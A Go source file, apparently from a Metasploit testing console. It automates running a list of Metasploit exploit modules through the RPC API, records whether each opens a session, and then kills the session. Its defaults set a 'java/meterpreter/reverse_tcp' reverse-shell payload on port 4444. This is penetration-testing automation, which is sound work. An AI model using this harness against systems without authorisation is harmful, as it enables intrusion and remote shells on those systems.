package metasploit

import (
	"fmt"
	"log"
	"os"
	"time"

	"github.com/AlexPodd/metasploit_tester_console/internal/domain"
	"github.com/fpr1m3/go-msf-rpc/rpc"
)

type MetaSploitRPC struct {
	InstanceMSF *rpc.Metasploit
	Report      *domain.Report
}

func (metaSploitRPC *MetaSploitRPC) Login(host, login, password string) (err error) {
	metaSploitRPC.Report = &domain.Report{}
	metaSploitRPC.InstanceMSF, err = rpc.New(host, login, password)
	if err != nil {
		log.Print(err)
	}
	file, err := os.OpenFile("app.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		log.Fatal("Failed to open log file:", err)
	}
	log.SetOutput(file)

	return err

}

func findParamsByName(exploits []domain.ConfigExploit, name string) map[string]string {
	for _, e := range exploits {
		if e.Name == name {
			return e.Params
		}
	}
	return setParamDefoult()
}

func setParamDefoult() map[string]string {
	defaults := map[string]string{
		"LHOST":   "127.0.0.1",
		"LPORT":   "4444",                         // порт для обратного соединения
		"PAYLOAD": "java/meterpreter/reverse_tcp", // тип payload
	}

	return defaults
}

func (metaSploitRPC *MetaSploitRPC) setParam(consoleId string, params map[string]string) {
	for key, value := range params {
		err := metaSploitRPC.consoleWrite(consoleId, "set "+key+" "+value)
		if err != nil {
			log.Print(err)
		}
	}
}

func (metaSploitRPC *MetaSploitRPC) consoleInit(consoleID string) error {
	_, err := metaSploitRPC.InstanceMSF.ConsoleWrite(consoleID, "reload_all\n")
	if err != nil {
		return err
	}

	err = metaSploitRPC.consoleRead(consoleID)
	return err
}

func (metaSploitRPC *MetaSploitRPC) consoleWrite(consoleID, command string) error {
	time.Sleep(1 * time.Second)
	_, err := metaSploitRPC.InstanceMSF.ConsoleWrite(consoleID, command+"\n")
	if err != nil {
		return err
	}
	err = metaSploitRPC.consoleRead(consoleID)
	return err
}

func (metaSploitRPC *MetaSploitRPC) consoleRead(consoleID string) error {
	timeout := time.After(30 * time.Second)
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-timeout:
			return fmt.Errorf("consoleRead: timeout waiting for console %s", consoleID)
		case <-ticker.C:
			res, err := metaSploitRPC.InstanceMSF.ConsoleRead(consoleID)
			if err != nil {
				return fmt.Errorf("consoleRead: %w", err)
			}
			if res.Data != "" {
				log.Print(res.Data)
			}
			if !res.Busy {
				return nil
			}
		}
	}
}

func (metaSploitRPC *MetaSploitRPC) exploitRun(consoleId string, config []domain.ConfigExploit, exploit domain.Exploit) (bool, error) {
	err := metaSploitRPC.consoleWrite(consoleId, "back")
	log.Print(err)
	err = metaSploitRPC.consoleWrite(consoleId, "unset all")
	log.Print(err)
	err = metaSploitRPC.consoleWrite(consoleId, "use "+exploit.Path)
	if err != nil {
		return false, err
	}
	params := findParamsByName(config, exploit.Name)
	metaSploitRPC.setParam(consoleId, params)
	err = metaSploitRPC.consoleWrite(consoleId, "exploit")
	log.Print(err)
	success := metaSploitRPC.closeSessionAttackMachine()
	metaSploitRPC.closeAllMSFSessions()
	return success, nil
}

func (metaSploitRPC *MetaSploitRPC) closeAllMSFSessions() {
	sessionList, err := metaSploitRPC.InstanceMSF.SessionList()
	if err != nil {
		log.Printf("Error getting session list: %v", err)
		return
	}

	if len(sessionList) == 0 {
		log.Println("No active sessions to close.")
		return
	}

	for id, session := range sessionList {
		log.Printf("Closing Session %d: Type=%s, Via=%s", id, session.Type, session.ViaExploit)

		switch session.Type {
		case "meterpreter":
			result, err := metaSploitRPC.InstanceMSF.SessionMeterpreterSessionKill(uint32(id))
			if err != nil {
				log.Printf("Error killing meterpreter session %d: %v", id, err)
			} else {
				log.Printf("Meterpreter session %d killed, result: %v", id, result)
			}
		case "shell":
			err := metaSploitRPC.InstanceMSF.SessionWrite(uint32(id), "exit\n")
			if err != nil {
				log.Printf("Error sending exit to shell session %d: %v", id, err)
				continue
			}

			var readPointer uint32 = 0
			for {
				output, err := metaSploitRPC.InstanceMSF.SessionRead(uint32(id), readPointer)
				if err != nil {
					log.Printf("Error reading from session %d: %v", id, err)
					break
				}
				if len(output) == 0 {
					break
				}
				readPointer += uint32(len(output))
				log.Printf("Session %d output: %s", id, output)
			}

			log.Printf("Shell session %d closed on target", id)
		default:
			log.Printf("Unknown session type %s for session %d", session.Type, id)
		}
	}

	log.Println("All active sessions processed.")
}

func (metaSploitRPC *MetaSploitRPC) closeSessionAttackMachine() bool {
	sessionList, err := metaSploitRPC.InstanceMSF.SessionList()
	if err != nil {
		log.Printf("Error getting session list: %v", err)
		return false
	}

	foundSession := false

	for id, session := range sessionList {
		foundSession = true // нашли хотя бы одну сессию
		log.Printf("Found Session %d: Type=%s, Via=%s", id, session.Type, session.ViaExploit)

		switch session.Type {
		case "meterpreter":
			result, err := metaSploitRPC.InstanceMSF.SessionMeterpreterSessionKill(uint32(id))
			if err != nil {
				log.Printf("Error killing meterpreter session %d: %v", id, err)
			} else {
				log.Printf("Killed meterpreter session %d, result: %v", id, result)
			}
		case "shell":
			err := metaSploitRPC.InstanceMSF.SessionWrite(uint32(id), "exit\n")
			if err != nil {
				log.Printf("Error sending exit to shell session %d: %v", id, err)
				continue
			}

			var readPointer uint32 = 0
			for {
				output, err := metaSploitRPC.InstanceMSF.SessionRead(uint32(id), readPointer)
				if err != nil {
					log.Printf("Error reading from session %d: %v", id, err)
					break
				}
				if len(output) == 0 {
					break
				}
				readPointer += uint32(len(output))
				log.Printf("Session %d output: %s", id, output)
			}
			log.Printf("Shell session %d closed on target", id)
		}
	}

	return foundSession
}

func (metaSploitRPC *MetaSploitRPC) Run(exploits []domain.Exploit, config []domain.ConfigExploit, ch chan int) (*domain.Report, error) {
	console, err := metaSploitRPC.InstanceMSF.ConsoleCreate()
	if err != nil {
		return nil, err
	}
	consoleId := console.Id
	defer metaSploitRPC.InstanceMSF.ConsoleDestroy(consoleId)

	err = metaSploitRPC.consoleInit(consoleId)
	if err != nil {
		return nil, err
	}

	for i, exploit := range exploits {
		var output string

		success, err := metaSploitRPC.exploitRun(consoleId, config, exploit)

		if err != nil {
			log.Print(err)
		}

		exploitRes := domain.ExploitResult{
			ExploitName: exploit.Name,
			Output:      output,
			Success:     success,
		}
		metaSploitRPC.Report.Results = append(metaSploitRPC.Report.Results, exploitRes)

		if ch != nil {
			ch <- i + 1
		}
		time.Sleep(3 * time.Second)
	}

	metaSploitRPC.Report.Timestamp = time.Now()

	return metaSploitRPC.Report, nil
}
